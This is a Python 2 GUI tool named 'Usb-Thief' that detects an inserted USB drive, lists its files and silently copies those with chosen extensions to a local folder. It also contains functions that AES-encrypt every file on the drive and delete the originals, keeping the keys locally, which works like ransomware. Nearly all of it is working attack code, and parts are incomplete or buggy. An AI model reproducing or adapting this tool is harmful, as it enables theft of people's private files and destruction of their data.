# -*- coding: utf-8 -*-
# Author: Steven
# !/usr/bin/python


from Tkinter import *
from Crypto.Hash import MD5
from Crypto.Cipher import AES
import platform
import shutil
import tkFileDialog
import ConfigParser
import commands
import datetime
import os
import time
import random
import string

global usb, save, use_platform, root, t1, t3, t4, t5, t6, count, config, path
# usb为usb路径，save为存储路径，use_platform为当前系统,root画板,t1消息框,t3系统,t4 u盘,t5 存储,t6 类型,count 个数,path 解密路径
flag = False  # flag为u盘存在标识,默认False
word = []

'''初始化'''
# 获取系统名称
def usePlatform():
    global use_platform
    use_platform = platform.system()

#配置文件
def set(file):
    global usb, save, use_platform, flag, t1, t3, t4, t5, t6, config
    config.readfp(file)
    try:  # 读取配置，如果没有对应配置则写入配置
        config.items(use_platform)
    except:
        writeSet(file)
    try:
        usb = config.get(use_platform, 'usb')
    except:
        mac_getUsb()
    if flag:
        save = config.get(use_platform, 'save')
        tmp = config.get(use_platform, 'word')
        for k in tmp.split(','):
            word.append(k)
        console(t1, '[+]设置的usb路径为' + usb.strip() + '\n')  # 输出消息
        console(t1, '[+]设置的存储路径为' + save.strip() + '\n')
        console(t1, '[+]需要保留文件格式为' + tmp.strip() + '\n')
        console(t4, usb.strip())
        console(t5, save.strip())
        console(t6, tmp.strip())
    if flag:
        usbWalker()

#Mac系统获取u盘
def mac_getUsb():
    global usb, flag
    result = commands.getoutput('ls /Volumes/').split('\n')[-1]
    if result == 'Macintosh HD':
        console(t1, '[!]没有usb设备\n')
    else:
        usb = '/Volumes/' + result
        flag = True

#windows系统获取u盘
def win_getUsb(usb_string):
    global flag, usb
    usb = usb_string.split('=')[1].strip()  # 如果为windows系统则记录u盘名称
    result = os.popen('dir ' + usb).read().strip()
    if result != '':
        flag = True
    else:
        console(t1, '[!]没有usb设备\n')

#读入配置文件
def importSet(t):
    global t1, use_platform

    path = tkFileDialog.askopenfile(title='python', filetypes=[('Initialization File', '.ini')])
    t1.delete(1.0, END)
    console(t1, '[*]打开ini,正在读取...\n')
    if path:
        set(path)
    else:
        console(t1, '[!]未导入配置\n')

#写入配置
def writeSet(file):
    global config, use_platform, t1
    config.add_section(use_platform)
    config.write(open(file.name, 'w'))
    console(t1, '[!]未读取到对应系统的配置，请完善配置文件\n')

'''U盘抓取部分'''
#u盘遍历
def usbWalker():
    global save, usb, t1, count
    count = 1
    if not os.path.exists(save):
        os.mkdir(save)
    start_time = time.time()
    console(t1, '[+]开始抓取数据\n')
    f = open(save + time.strftime("%m%d%H%M", time.localtime(time.time())) + ".txt", "w")  # 创建txt记录文件内容
    for root, dirs, files in os.walk(usb):  # 遍历查询
        for file in files:
            export = os.path.join(root, file)
            f.writelines(export + '\n')
            try:
                if extentionName(file):  # 查找有无符合后缀的文件
                    copyfile(export)
            except:
                pass
    f.close
    end_time = time.time()
    consume_time = end_time - start_time
    console(t1, "[*]拷贝文件完成\n")
    console(t1, '[*]总共用时' + str(consume_time) + ' s \n')
    count = 1

#校检后缀
def extentionName(file_name):
    judge_name = file_name.split('.')[-1]
    for extend_name in word:
        if judge_name == extend_name:  # 遍历查询
            return 1
    return 0

#拷贝文件
def copyfile(file_name):
    global usb, save, t1, count
    shutil.copy(file_name, save)
    console(t1, '[+]已经抓取 ' + str(count) + '个文件\n')
    count = count + 1

'''GUI界面'''
def table():
    global root
    root = Tk()
    root.title('Usb-Thief')
    root.geometry('350x375+400+300')
    root['bg'] = 'grey'
    root.resizable(False, False)
    widgetInit(root)
    root.mainloop()


def widgetInit(root):
    global use_platform, t1, t3, t4, t5, t6
    b1 = Button(root, text='导入配置', width=5, command=lambda: importSet(t1))
    b2 = Button(root, text='加密文件', width=5)
    b3 = Button(root, text='解密文件', width=5, command=lambda: setDir())
    t1 = Text(root, width=20)  # 信息框
    t2 = Entry(root, width=15)  # 配置路径
    t3 = Entry(root, width=15)  # 系统
    t4 = Entry(root, width=15)  # u盘
    t5 = Entry(root, width=15)  # 存储路径
    t6 = Entry(root, width=15)  # 文件类型

    l1 = Label(root, text='系统')
    l2 = Label(root, text='u盘')
    l3 = Label(root, text='存储')
    l4 = Label(root, text='类型')

    b1.place(x=150, y=10)
    b2.place(x=150, y=70)
    b3.place(x=250, y=70)
    t1.place(x=0, y=0)
    t2.place(x=150, y=40)
    t3.place(x=190, y=110)
    t4.place(x=190, y=160)
    t5.place(x=190, y=210)
    t6.place(x=190, y=260)

    l1.place(x=150, y=113)
    l2.place(x=150, y=163)
    l3.place(x=150, y=213)
    l4.place(x=150, y=263)

    t3.insert(END, use_platform)

# 消息框显示
def console(t, txt):
    t.insert(END, txt)
    t.focus_force()


'''加密解密部分'''
#解码按钮设置解码路径
def setDir():
    global path
    path = tkFileDialog.askdirectory(title='python')
    if path:
        de_aseFile(path)
#解码函数
def de_aseFile(path):
    global config
    key=config.get('key','key')
    iv = config.get('iv','iv')

    for root,dirs,files in os.walk(path):
        for file in files:
            export = os.path.join(root, file)

            if isCipher(file):
                pass
            else:
                f=open(export,'rb')
                f_msg=f.read()

                decipher = AES.new(key, AES.MODE_CFB, iv)
                decipherText=decipher.decrypt(f_msg)

                f_new=open(export.replace('.cipher',''),'wb+')
                f_new.write(decipherText)
                f.close()
                f_new.close()
#目录遍历
def dirWalker():
    global usb
    exportKey()
    for root, dirs, files in os.walk(usb):  # 遍历查询
        for file in files:
            export = os.path.join(root, file)
            if isCipher(file):
                aseFile(export)

#文件加密
def aseFile(export):
    global key, iv
    cipher = AES.new(key, AES.MODE_CFB, iv)  # 生成密码

    f = open(export, 'rb')
    f_msg = f.read()

    x = len(f_msg) % 32
    if x != 0:  # 如果需要补位
        f_fixed = f_msg + '0' * (32 - x)
    else:
        f_fixed = f_msg

    cipherText = cipher.encrypt(f_fixed)

    f_new = open(export + '.cipher', 'wb+')
    f_new.write(cipherText)
    f.close()
    f_new.close()
    os.remove(export)

#秘钥导出
def exportKey():
    global key, iv, save
    timeNow = datetime.datetime.now()  # 获取当前时间
    recordTime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
    h = MD5.new()  # 以下为生成MD5
    h.update(str(timeNow))
    key = h.hexdigest()  # 32位
    iv = ''.join(random.sample(string.ascii_letters + string.digits, 16))
    f = open(save + recordTime + '.txt', 'w+')  # 写入秘钥和salt
    f.write('key: ' + key + '\niv: ' + iv)

#判断是否加密
def isCipher(file_name):
    if file_name.split('.')[-1] == 'cipher':
        return 0
    else:
        return 1


config = ConfigParser.ConfigParser()
usePlatform()
table()
